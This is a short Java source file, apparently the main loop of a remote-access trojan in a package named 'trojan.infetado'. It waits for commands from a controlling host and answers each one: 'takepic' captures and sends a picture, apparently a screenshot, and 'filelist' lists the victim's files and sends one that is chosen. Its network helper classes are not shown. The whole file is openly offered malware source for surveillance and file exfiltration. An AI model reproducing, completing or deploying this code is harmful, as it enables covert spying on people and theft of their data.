package trojan.infetado;

import java.awt.AWTException;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import network.*;

public class Main {

    public static void main(String[] args) throws AWTException, IOException {

        final String pic = "takepic";
        final String off = "off";
        final String file = "filelist";

        RecieveCom cc = new RecieveCom();

        String msg = "on";
        do {

            msg = cc.com;

            if (msg.equals(pic)) {
                TakePicture aut = new TakePicture();
                aut.takePicture();
                SendPic s = new SendPic();
            } else if (msg.equals(file)) {
                SendArray sa = new SendArray();
                RecieveNum rn = new RecieveNum();
                SendNome sn = new SendNome();
                SendFile sf = new SendFile();
            }

        } while (!msg.equals(off));

    }

}
